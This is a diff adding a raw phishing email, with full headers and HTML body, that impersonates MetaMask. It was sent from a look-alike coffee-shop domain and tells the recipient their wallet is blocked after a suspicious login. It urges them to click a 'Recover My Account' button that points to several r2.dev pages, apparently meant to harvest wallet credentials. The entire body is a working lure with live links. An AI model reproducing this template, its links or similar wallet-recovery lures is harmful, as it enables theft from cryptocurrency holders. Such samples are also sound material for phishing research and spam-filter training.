@@ -1,0 +1,267 @@
+Return-Path: chief@grinders4coffee.co.uk.coffeeomega.co.uk
+Delivered-To: jose@monkey.org
+X-FDA: 82204501554.22.34FAADD
+Received: from coffeeomega.co.uk (unknown [91.238.162.112])
+	by imf23.b.hostedemail.com (Postfix) with ESMTP id BF5C8160012
+	for <jose@monkey.org>; Fri,  7 Jun 2024 15:39:14 +0000 (UTC)
+Authentication-Results: imf23.b.hostedemail.com;	dkim=pass
+ header.d=grinders4coffee.co.uk.coffeeomega.co.uk header.s=default header.b="Z
+ XMvmCK";	spf=pass (imf23.b.hostedemail.com: domain of
+ chief@grinders4coffee.co.uk.coffeeomega.co.uk designates 91.238.162.112 as
+ permitted sender)
+ smtp.mailfrom=chief@grinders4coffee.co.uk.coffeeomega.co.uk;	dmarc=pass
+ (policy=quarantine) header.from=coffeeomega.co.uk
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1717774755; a=rsa-sha256;
+	cv=none;
+	b=t+UotLsFWiOQAvLBPIbm9c4o8MMvQ/E3zJo3q5SThmqGDxsrPKigsDrmlZ1U9fS2YdL8I1
+	LuFlRfb1Qei0nQesKujL8VAhIILv39HwZ0orXcpmqsy1feYsgTLTK9R3+s6JH+BJYs2lc4
+	gfHQYO4fdB2uI3yt/Uxh3wmiaKF3TLM=
+ARC-Authentication-Results: i=1;	imf23.b.hostedemail.com;	dkim=pass
+ header.d=grinders4coffee.co.uk.coffeeomega.co.uk header.s=default header.b="Z
+ XMvmCK";	spf=pass (imf23.b.hostedemail.com: domain of
+ chief@grinders4coffee.co.uk.coffeeomega.co.uk designates 91.238.162.112 as
+ permitted sender)
+ smtp.mailfrom=chief@grinders4coffee.co.uk.coffeeomega.co.uk;	dmarc=pass
+ (policy=quarantine) header.from=coffeeomega.co.uk
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1717774755;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=IVrfJreGoG62jlFA7mf+E2AQaEClkflsqNLDANfIRHY=;
+	b=RAA6b/45uJs6arR3Eh98qxucHo2qWNiKwvj61S0TNlPWSAKO/t0la8EHLUidM++DoXbOtr
+	DXd6QBhRQk4+qwqxyeCnD92luaem+4yTyI+JMWe++jqnj/LY4dCJi2kP2O2JaPd9+OblzU
+	6+cUviI10z+f9vRM4wHL01B+wl2PZsE=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=grinders4coffee.co.uk.coffeeomega.co.uk; s=default;
+	h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:Subject
+	:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
+	Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
+	References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
+	List-Owner:List-Archive; bh=IVrfJreGoG62jlFA7mf+E2AQaEClkflsqNLDANfIRHY=; b=Z
+	XMvmCKmcKZMZ/hoGfHfWZ6icEyFzLLoqaT4T9akxn88Ydq/pUXfCHq/aRLLaiuInauq2WgivZ8yg/
+	riOBDyx/k0nfiS4+/d1dFV6bAgQNpzq2C5xAVF7+aRomYn2AljTuTdeyU/4WbShe/LqUvgJQEvHOa
+	+dndmRkAz50FMplCO0ckvWouvTXT1DjnCp90pxIxu96TWjOQOVwDMKUXWKuluVvwH32Qtei1NU7tQ
+	JoysizZXBcWKkH14FiMu/8ZrwjB4UOlaHw6yUGt49MyjU7qib/uy7ReDTUlD65Pui+X9ZDntSFRFk
+	8V/dVYrBDXqJvj89HuHQEQn0av50GiGrw==;
+Received: from [66.225.254.208] (port=54462)	by server.coffeeomega.co.uk with
+ esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384	(Exim 4.96.2)
+	(envelope-from <chief@grinders4coffee.co.uk.coffeeomega.co.uk>)	id
+ 1sFbgR-0004Tu-10	for jose@monkey.org;	Fri, 07 Jun 2024 15:39:13 +0000
+From: =?UTF-8?B?TWV0YU1hc2s=?= <chief@grinders4coffee.co.uk.coffeeomega.co.uk>
+To: jose@monkey.org
+Subject: =?UTF-8?B?WW91ciBNZXRhTWFzayB3YWxsZXQgd2lsbCBiZSBzdXNwZW5kZWQu?=
+Date: 7 Jun 2024 08:39:12 -0700
+Message-ID:
+ <20240607083912.D95E6486D6FC069D@grinders4coffee.co.uk.coffeeomega.co.uk>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server.coffeeomega.co.uk
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - grinders4coffee.co.uk.coffeeomega.co.uk
+X-Get-Message-Sender-Via: server.coffeeomega.co.uk: authenticated_id:
+ chief@grinders4coffee.co.uk.coffeeomega.co.uk
+X-Authenticated-Sender:
+ server.coffeeomega.co.uk: chief@grinders4coffee.co.uk.coffeeomega.co.uk
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam09
+X-Rspamd-Queue-Id: BF5C8160012
+X-Rspam-User: 
+X-Spam-Status: No, score=8.84
+X-Stat-Signature: 3nyaamu8jxr58z7uge1q6hqk3kd1xjbc
+X-HE-Tag: 1717774754-637006
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19iGUMj/Rc+bDTkknr2WYTDYlHsjUEKc/QtZJ2fVx7sxHZ?=
+ =?utf-8?q?fjqlDoEc7wEYelMSErSCgM03+6A3LLbrTwJU2sLntdkR4nfWHXV6Wz5VqFBifTXYT?=
+ =?utf-8?q?JXA95ZB8dUNQDjm+P+h4Iu3tVKnBgAhaRmoRrQOuVhnG+FCk0B6qZcuqeXUgHU+U2?=
+ =?utf-8?q?D+PAipRev9rWM8GQ77JQT8VYPPG+APU8h4CygNpVIjNL0dTmJs=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 175
+
+<!DOCTYPE html>
+
+<html lang=3D"en"><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta charset=3D"UTF-8">
+    <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=
+=3D1.0">
+    <title>Important Notice</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+
+        .email-container {
+            max-width: 600px;
+            margin: 20px auto;
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+
+        .ledger-logo {
+            display: block;
+            margin: 0 auto 10px;
+            max-width: 200px;
+        }
+
+        .email-header {
+            text-align: center;
+            border-bottom: 1px solid #e8e8e8;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
+        .email-content p {
+            line-height: 1.7;
+            color: #333;
+            font-size: 16px;
+            margin: 16px 0;
+        }
+
+        .alert-text {
+            background-color: #FFEBEB;
+            padding: 10px;
+            margin: 20px 0;
+            border: 1px solid #FF5300;
+            border-radius: 5px;
+            color: #d93a00;
+        }
+
+        .recover-button {
+            display: block;
+            width: 100%;
+            max-width: 250px;
+            margin: 30px auto;
+            text-align: center;
+            padding: 10px 15px;
+            background-color: #FF5300;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            transition: background-color 0.3s;
+        }
+
+        .recover-button:hover, .recover-button:focus {
+            background-color: #d93a00;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: 40px;
+        }
+
+        /* Media Queries for Responsiveness */
+        @media screen and (max-width: 640px) {
+            .email-container {
+                padding: 15px;
+            }
+
+            .ledger-logo {
+                max-width: 150px;
+            }
+
+            .email-header h2 {
+                font-size: 20px;
+            }
+        }
+
+    </style>
+</head>
+
+<body style=3D"font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0">
+    <div style=3D"max-width: 600px;
+            margin: 20px auto;
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05)" class=3D"email-cont=
+ainer">
+        <div style=3D"text-align: center;
+            border-bottom: 1px solid #e8e8e8;
+            padding-bottom: 10px;
+            margin-bottom: 20px" class=3D"email-header">
+
+            <h2><img width=3D"222" height=3D"122" align=3D"middle" style=3D=
+"border-color: rgb(0, 0, 0);" src=3D"https://1000logos.net/wp-content/uploa=
+ds/2022/05/MetaMask-Emblem.png"></h2>
+          <h2><br></h2>
+        </div>
+        <div class=3D"email-content">
+            </div><p class=3D"email-content">Dear Customer,</p><div class=
+=3D"email-content">
+            </div><p class=3D"email-content">We noticed that someone just t=
+ried to log in to your&nbsp;MetaMask from location you have not used before=
+, so we want to make sure it's really you.</p><div class=3D"email-content">=
+
+            </div><div style=3D"background-color: #FFEBEB;
+            padding: 10px;
+            margin: 20px 0;
+            border: 1px solid #FF5300;
+            border-radius: 5px;
+            color: #d93a00" class=3D"alert-text">
+                Your account and your wallet have been temporarily blocked =
+to prevent you from losing&nbsp;your assets.
+            </div><div class=3D"email-content">
+            </div><h3 class=3D"email-content">How can I recover my account?=
+</h3><div class=3D"email-content">
+            </div><div class=3D"email-content"><ol>
+                <li>Click and follow the instructions to recover your accou=
+nt and unblock it.</li>
+                <li>Wait for 30 - 60 minutes before conducting&nbsp;any tra=
+nsactions from your wallet.</li><li>After completing the process, enable Tw=
+o-Factor Authentication</li></ol></div><ol>
+            </ol>
+            <a style=3D"display: block;
+            width: 100%;
+            max-width: 250px;
+            margin: 30px auto;
+            text-align: center;
+            padding: 10px 15px;
+            background-color: #FF5300;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            transition: background-color 0.3s" class=3D"recover-button" hre=
+f=3D"https://pub-485c938c1a1b43b2bbc5b99155f2de68.r2.dev/giudnfud.html" <a=
+=3D"">https://pub-485c938c1a1b43b2bbc5b99155f2de68.r2.dev/giudnfud.html</a>=
+">https://pub-7c604c162b9e4affa2244c4369079399.r2.dev/xmkedswo.html</a>">ht=
+tps://pub-8c1c14c3b0d64d0099312bb4670f2e23.r2.dev/hjokedd.html</a>"><a href=
+=3D"https://pub-b8bbbd543997401cb01de602d69d75ee.r2.dev/ghesne.html">https:=
+//pub-b8bbbd543997401cb01de602d69d75ee.r2.dev/ghesne.html</a></a>">Recover =
+My Account</a>
+=20=20=20=20=20=20=20=20
+        <div style=3D"font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: 40px" class=3D"footer-text">
+            &copy; 2024 MetaMask. All rights reserved.
+        </div>
+    </div>
+
+
+
+</body></html>
+
